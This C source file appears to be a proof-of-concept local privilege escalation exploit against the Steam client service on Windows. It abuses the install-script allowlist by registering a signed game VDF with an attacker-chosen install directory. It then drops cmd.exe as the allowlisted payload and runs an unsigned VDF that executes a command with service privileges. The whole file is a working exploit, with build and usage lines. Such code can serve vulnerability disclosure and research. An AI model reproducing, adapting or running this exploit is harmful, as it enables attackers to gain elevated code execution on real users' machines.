// Build: cl /nologo /O2 lpe_installutils_vdf.c /Fe:lpe_installutils_vdf.exe advapi32.lib
// Usage: lpe_installutils_vdf.exe [steamclient64.dll] [untrusted]
#include "poc_connect.h"

// A Valve-signed VDF containing a "Run Process" entry of the form
// "%INSTALLDIR%\<PAYLOAD_RELATIVE_PATH>". Ships with many games (EAC / redists).
#define SIGNED_VDF_PATH       "D:\\Steam\\steamapps\\common\\Halo The Master Chief Collection\\installscript.vdf"
#define PAYLOAD_RELATIVE_PATH "easyanticheat\\easyanticheat_eos_setup.exe"
#define REDIR_OUT            "C:\\Windows\\Temp\\steam_lpe_proof.txt"

static void mkdirs(const char *dir) {
    char buf[MAX_PATH]; lstrcpynA(buf, dir, sizeof(buf));
    for (char *p = buf; *p; p++)
        if (*p == '\\') { *p = '\0'; CreateDirectoryA(buf, NULL); *p = '\\'; }
    CreateDirectoryA(buf, NULL);
}

// write an unsigned "Run Process" VDF whose process path is our allowlisted exe
static int write_unsigned_vdf(const char *path, const char *exe_path) {
    char esc[MAX_PATH * 2]; int j = 0;
    for (int i = 0; exe_path[i] && j < (int)sizeof(esc) - 2; i++) {
        if (exe_path[i] == '\\') esc[j++] = '\\';
        esc[j++] = exe_path[i];
    }
    esc[j] = '\0';
    FILE *f = fopen(path, "w");
    if (!f) return 0;
    fprintf(f,
        "\"InstallScript\"\n{\n  \"Run Process\"\n  {\n    \"process 1\"\n    {\n"
        "      \"HasRunKey\"  \"HKEY_LOCAL_MACHINE\\\\Software\\\\Valve\\\\Steam\\\\Apps\\\\0\"\n"
        "      \"Process 1\"  \"%s\"\n"
        "      \"Command 1\"  \"/c whoami > %s 2>&1\"\n"
        "      \"NoCleanUp\"  \"1\"\n"
        "    }\n  }\n}\n", esc, REDIR_OUT);
    fclose(f);
    return 1;
}

int main(int argc, char **argv)
{
    char dll[MAX_PATH] = {0}; int untrusted = 0;
    for (int i = 1; i < argc; i++) {
        if (_stricmp(argv[i], "untrusted") == 0) untrusted = 1;
        else lstrcpynA(dll, argv[i], sizeof(dll));
    }

    CSteamServiceWin32 *svc = steam_connect(dll[0] ? dll : NULL, untrusted);
    if (!svc) return 1;

    char temp[MAX_PATH], payload_dir[MAX_PATH], payload[MAX_PATH], vdf[MAX_PATH], sys_cmd[MAX_PATH];
    GetTempPathA(MAX_PATH, temp);
    _snprintf(payload_dir, MAX_PATH, "%sexploit_dir", temp);
    _snprintf(payload, MAX_PATH, "%s\\%s", payload_dir, PAYLOAD_RELATIVE_PATH);
    _snprintf(vdf, MAX_PATH, "%sexploit.vdf", temp);

    // Place cmd.exe as the payload the signed VDF's %INSTALLDIR% path points at.
    { char *s = strrchr(payload, '\\'); if (s) { *s = '\0'; mkdirs(payload); *s = '\\'; } }
    GetSystemDirectoryA(sys_cmd, MAX_PATH);
    lstrcatA(sys_cmd, "\\cmd.exe");
    if (!CopyFileA(sys_cmd, payload, FALSE)) { printf("[!] could not place payload: %lu\n", GetLastError()); return 1; }
    printf("[*] payload dropped: %s\n", payload);

    int rc = 1;
    __try {
        IClientInstallUtilsMap *iu = svc->pInstallUtils;
        if (!iu) { printf("[!] IClientInstallUtils not available\n"); __leave; }

        printf("[*] AddInstallScriptToWhiteList(signed VDF, installDir=\"%s\")\n", payload_dir);
        uint32_t wl = iu->vtbl->AddInstallScriptToWhiteList(iu, SIGNED_VDF_PATH, payload_dir);
        printf("[+] allowlist %u entrie(s)\n", wl);
        if ((int)wl <= 0) { printf("[!] allowlist failed (missing/invalid signed VDF?)\n"); __leave; }

        if (!write_unsigned_vdf(vdf, payload)) { printf("[!] could not write unsigned VDF\n"); __leave; }
        iu->vtbl->RunInstallScript(iu, vdf, 0, 0);

        Sleep(3000);
        if (GetFileAttributesA(REDIR_OUT) != INVALID_FILE_ATTRIBUTES) {
            printf("[+] code execution -> %s\n", REDIR_OUT);
            rc = 0;
        } else {
            printf("[-] outfile not found -- check the signed VDF path / process entry\n");
            rc = 2;
        }
        DeleteFileA(vdf);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("[!] faulted 0x%08lX\n", GetExceptionCode());
    }

    if (untrusted) RevertToSelf();
    return rc;
}
